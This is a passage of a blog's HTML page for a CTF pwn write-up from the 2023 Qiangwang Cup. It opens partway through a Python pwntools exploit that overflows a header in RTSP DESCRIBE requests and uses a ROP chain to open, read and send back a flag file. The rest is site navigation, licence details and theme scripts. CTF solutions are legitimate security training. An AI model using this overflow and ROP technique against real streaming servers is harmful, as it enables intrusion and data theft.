&#x27;</span>+session+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;DESCRIBE_FLAG: qwb\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>rdi=codebase+<span class="hljs-number">0x7b133</span><br>rsi=codebase+<span class="hljs-number">0x99fb0</span><br>rdx=codebase+<span class="hljs-number">0x19eaa</span><br>rax=codebase+<span class="hljs-number">0x35e4a</span><br>flag=codebase+<span class="hljs-number">0x7B3E5</span><br>read=codebase+<span class="hljs-number">0x18200</span><br>syscall=codebase+<span class="hljs-number">0x19EAC</span><br>gift=codebase+<span class="hljs-number">0x2a9990</span><br><br>shellcode=<span class="hljs-string">b&#x27;DESCRIBE rtsp://192.168.111.143:8554/wavAudioTest RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;Session: &#x27;</span>+session+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;vul_string: &#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">396</span>+p32(<span class="hljs-number">0x198</span>)+p32(<span class="hljs-number">0x1f4</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br><br>shellcode+=p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>shellcode+=p64(rdi)+p64(<span class="hljs-number">7</span>)+p64(rsi)+p64(gift)+p64(rdx)+p64(<span class="hljs-number">0x50</span>)+p64(read)<br>shellcode+=p64(rdi)+p64(<span class="hljs-number">5</span>)+p64(rsi)+p64(gift)+p64(rdx)+p64(<span class="hljs-number">0x50</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br><br>shellcode+=<span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/WP/" class="category-chain-item">WP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023 强网杯线上赛 pwn wp</div>
+      <div>http://akaieurus.github.io/2024/01/25/2023强网杯线上赛pwnwp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/28/2023TPCTFpwnwp/" title="2023 TPCTF pwn wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2023 TPCTF pwn wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/" title="2023 0CTF 无中生有系列">
+                        <span class="hidden-mobile">2023 0CTF 无中生有系列</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
